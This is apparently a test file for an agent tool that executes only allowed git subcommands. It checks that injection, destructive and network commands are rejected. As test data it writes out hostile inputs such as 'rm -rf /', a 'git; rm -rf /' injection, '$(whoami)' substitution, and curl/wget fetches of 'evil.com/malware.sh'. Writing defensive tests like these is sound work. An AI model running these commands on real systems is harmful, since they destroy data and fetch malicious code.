/**
 * Tests for agents/bash-executor/index.mjs
 *
 * Function signatures:
 * - default export: executeSafeShellCommands({ commands }): Execute git commands safely
 *
 * NOTE: Tests avoid actual git command execution where possible.
 * Tests focus on input validation and module structure.
 */

import { describe, test, expect, beforeAll } from "bun:test";

describe("bash-executor", () => {
  let bashExecutor;

  beforeAll(async () => {
    bashExecutor = await import("../../../agents/bash-executor/index.mjs");
  });

  // ==================== Happy Path ====================
  describe("Happy Path", () => {
    describe("module exports", () => {
      test("should export default function with expected properties", () => {
        expect(bashExecutor.default).toBeDefined();
        expect(typeof bashExecutor.default).toBe("function");
        expect(bashExecutor.default.description).toBeDefined();
        expect(typeof bashExecutor.default.description).toBe("string");
        expect(bashExecutor.default.input_schema).toBeDefined();
        expect(bashExecutor.default.input_schema.type).toBe("object");
        expect(bashExecutor.default.output_schema).toBeDefined();
        expect(bashExecutor.default.output_schema.type).toBe("object");
      });
    });

    describe("input_schema structure", () => {
      test("should define commands as required array restricted to git", () => {
        const schema = bashExecutor.default.input_schema;
        expect(schema.required).toContain("commands");
        expect(schema.properties.commands.type).toBe("array");
        const commandEnum = schema.properties.commands.items.properties.command.enum;
        expect(commandEnum).toEqual(["git"]);
      });
    });

    describe("output_schema structure", () => {
      test("should require success and results array", () => {
        const schema = bashExecutor.default.output_schema;
        expect(schema.required).toContain("success");
        expect(schema.required).toContain("results");
        expect(schema.properties.results.type).toBe("array");
      });
    });

    describe("description content", () => {
      test("should mention git commands and supported subcommands", () => {
        const desc = bashExecutor.default.description.toLowerCase();
        expect(desc).toContain("git");
        expect(desc).toContain("init");
        expect(desc).toContain("clone");
        expect(desc).toContain("commit");
      });
    });
  });

  // ==================== Unhappy Path ====================
  describe("Unhappy Path", () => {
    describe("input validation", () => {
      test("should reject non-array commands", () => {
        const result = bashExecutor.default({ commands: "not-array" });
        expect(result.success).toBe(false);
        expect(result.error).toContain("array");
      });

      test("should reject empty commands array", () => {
        const result = bashExecutor.default({ commands: [] });
        expect(result.success).toBe(false);
        expect(result.error).toContain("empty");
      });

      test("should reject null commands", () => {
        const result = bashExecutor.default({ commands: null });
        expect(result.success).toBe(false);
      });

      test("should reject undefined commands", () => {
        const result = bashExecutor.default({ commands: undefined });
        expect(result.success).toBe(false);
      });
    });

    describe("command validation", () => {
      test("should reject non-git commands", () => {
        const result = bashExecutor.default({
          commands: [{ command: "ls", args: ["-la"] }],
        });
        expect(result.success).toBe(false);
        expect(result.results[0].error).toContain("Unsupported command");
      });

      test("should reject bash command", () => {
        const result = bashExecutor.default({
          commands: [{ command: "bash", args: ["-c", "echo test"] }],
        });
        expect(result.success).toBe(false);
      });

      test("should reject rm command", () => {
        const result = bashExecutor.default({
          commands: [{ command: "rm", args: ["-rf", "/"] }],
        });
        expect(result.success).toBe(false);
      });

      test("should reject empty command", () => {
        const result = bashExecutor.default({
          commands: [{ command: "", args: [] }],
        });
        expect(result.success).toBe(false);
      });
    });

    describe("git subcommand validation", () => {
      test("should reject unsupported git subcommand", () => {
        const result = bashExecutor.default({
          commands: [{ command: "git", args: ["push", "origin", "main"] }],
        });
        expect(result.success).toBe(false);
        expect(result.results[0].error).toContain("Unsupported git subcommand");
      });

      test("should reject git reset command", () => {
        const result = bashExecutor.default({
          commands: [{ command: "git", args: ["reset", "--hard"] }],
        });
        expect(result.success).toBe(false);
      });

      test("should reject git without subcommand", () => {
        const result = bashExecutor.default({
          commands: [{ command: "git", args: [] }],
        });
        expect(result.success).toBe(false);
        expect(result.results[0].error).toContain("subcommand");
      });
    });
  });

  // ==================== Critical Error Scenarios ====================
  describe("Critical Error Scenarios", () => {
    describe("dangerous command prevention", () => {
      test("should prevent git push (data exfiltration)", () => {
        const result = bashExecutor.default({
          commands: [{ command: "git", args: ["push", "--force", "origin", "main"] }],
        });
        expect(result.success).toBe(false);
      });

      test("should prevent git remote add", () => {
        const result = bashExecutor.default({
          commands: [
            {
              command: "git",
              args: ["remote", "add", "evil", "https://evil.com/repo"],
            },
          ],
        });
        expect(result.success).toBe(false);
      });

      test("should prevent git rebase", () => {
        const result = bashExecutor.default({
          commands: [{ command: "git", args: ["rebase", "-i", "HEAD~5"] }],
        });
        expect(result.success).toBe(false);
      });
    });

    describe("batch execution behavior", () => {
      test("should stop on first failure", () => {
        const result = bashExecutor.default({
          commands: [
            { command: "invalid", args: [] },
            { command: "git", args: ["status"] },
          ],
        });
        // Should only have one result since first command failed
        expect(result.results.length).toBe(1);
      });

      test("should report correct counts on failure", () => {
        const result = bashExecutor.default({
          commands: [{ command: "not-git", args: ["test"] }],
        });
        expect(result.failed).toBe(1);
        expect(result.succeeded).toBe(0);
      });

      test("should return all required fields in result", () => {
        const result = bashExecutor.default({
          commands: [{ command: "git", args: ["unsupported"] }],
        });
        expect(result).toHaveProperty("success");
        expect(result).toHaveProperty("results");
        expect(result.results[0]).toHaveProperty("command");
        expect(result.results[0]).toHaveProperty("output");
        expect(result.results[0]).toHaveProperty("error");
      });
    });

    describe("result structure", () => {
      test("should include command string in result", () => {
        const result = bashExecutor.default({
          commands: [{ command: "git", args: ["bad-subcommand"] }],
        });
        expect(result.results[0].command).toContain("git");
        expect(result.results[0].command).toContain("bad-subcommand");
      });

      test("should provide total count", () => {
        const result = bashExecutor.default({
          commands: [{ command: "ls", args: [] }],
        });
        expect(typeof result.total).toBe("number");
      });
    });
  });

  // ==================== Security Scenarios ====================
  describe("Security Scenarios", () => {
    describe("command injection prevention", () => {
      test("should reject shell metacharacters in command", () => {
        const result = bashExecutor.default({
          commands: [{ command: "git; rm -rf /", args: [] }],
        });
        expect(result.success).toBe(false);
      });

      test("should treat pipe operator in args as literal string (not shell operator)", () => {
        const result = bashExecutor.default({
          commands: [{ command: "git", args: ["status", "|", "cat", "/etc/passwd"] }],
        });
        // Command goes through as git status with extra args
        // The pipe is treated as literal arg, not shell operator
        expect(result.results[0]).toBeDefined();
      });

      test("should treat shell substitution as literal string (not execute)", () => {
        const result = bashExecutor.default({
          commands: [{ command: "git", args: ["log", "--oneline", "$(whoami)"] }],
        });
        // Should treat $(whoami) as literal string, not execute
        expect(result.results[0]).toBeDefined();
      });

      test("should treat backtick substitution as literal string (not execute)", () => {
        const result = bashExecutor.default({
          commands: [{ command: "git", args: ["log", "`id`"] }],
        });
        expect(result.results[0]).toBeDefined();
      });
    });

    describe("path traversal handling", () => {
      test("should pass path traversal in clone URL to git (git handles the validation)", () => {
        const result = bashExecutor.default({
          commands: [{ command: "git", args: ["clone", "file:///etc/passwd", "."] }],
        });
        // Clone is allowed but the file protocol is git's concern
        expect(result.results[0]).toBeDefined();
      });

      test("should pass .. in args to git (git handles path validation)", () => {
        const result = bashExecutor.default({
          commands: [{ command: "git", args: ["add", "../../../etc/passwd"] }],
        });
        // Git handles the path, not shell
        expect(result.results[0]).toBeDefined();
      });
    });

    describe("environment and system protection", () => {
      test("should not allow curl command", () => {
        const result = bashExecutor.default({
          commands: [{ command: "curl", args: ["https://evil.com/malware.sh"] }],
        });
        expect(result.success).toBe(false);
      });

      test("should not allow wget command", () => {
        const result = bashExecutor.default({
          commands: [{ command: "wget", args: ["https://evil.com/malware.sh"] }],
        });
        expect(result.success).toBe(false);
      });

      test("should not allow chmod command", () => {
        const result = bashExecutor.default({
          commands: [{ command: "chmod", args: ["+x", "malware.sh"] }],
        });
        expect(result.success).toBe(false);
      });

      test("should not allow eval in any form", () => {
        const result = bashExecutor.default({
          commands: [{ command: "eval", args: ["rm -rf /"] }],
        });
        expect(result.success).toBe(false);
      });
    });

    describe("git-specific security", () => {
      test("should reject git gc (can corrupt repo)", () => {
        const result = bashExecutor.default({
          commands: [{ command: "git", args: ["gc", "--aggressive"] }],
        });
        expect(result.success).toBe(false);
      });

      test("should reject git filter-branch (rewrites history)", () => {
        const result = bashExecutor.default({
          commands: [
            {
              command: "git",
              args: ["filter-branch", "--force", "--all"],
            },
          ],
        });
        expect(result.success).toBe(false);
      });

      test("should reject git reflog (exposes sensitive history)", () => {
        const result = bashExecutor.default({
          commands: [{ command: "git", args: ["reflog", "expire", "--all"] }],
        });
        expect(result.success).toBe(false);
      });
    });
  });
});
